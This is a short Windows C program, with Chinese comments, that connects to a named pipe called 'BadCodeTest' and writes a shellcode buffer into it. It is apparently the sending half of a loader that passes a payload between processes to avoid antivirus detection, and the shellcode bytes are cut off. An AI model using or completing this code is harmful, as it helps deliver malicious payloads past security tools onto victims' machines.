#include <Windows.h>
#include <stdio.h>
#include <intrin.h>

#define BUFF_SIZE 1024
char buf[] = "\xf6\x42\x89\xee\...";
PTCHAR ptsPipeName = TEXT("\\\\.\\pipe\\BadCodeTest");


BOOL RecvShellcode(VOID) {
    HANDLE hPipeClient;
    DWORD dwWritten;
    DWORD dwShellcodeSize = sizeof(buf);
    // 等待管道可用
    WaitNamedPipe(ptsPipeName, NMPWAIT_WAIT_FOREVER);
    // 连接管道
    hPipeClient = CreateFile(ptsPipeName, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hPipeClient == INVALID_HANDLE_VALUE) {
        printf("[+]Can't Open Pipe , Error : %d \n", GetLastError());
        return FALSE;
    }

    WriteFile(hPipeClient, buf, dwShellcodeSize, &dwWritten, NULL);
    if (dwWritten == dwShellcodeSize) {
        CloseHandle(hPipeClient);
        printf("[+]Send Success ! Shellcode : %d Bytes\n", dwShellcodeSize);
        return TRUE;
    }
    CloseHandle(hPipeClient);
    return FALSE;
}

int wmain(int argc, TCHAR* argv[]) {

    RecvShellcode();

    return 0;
}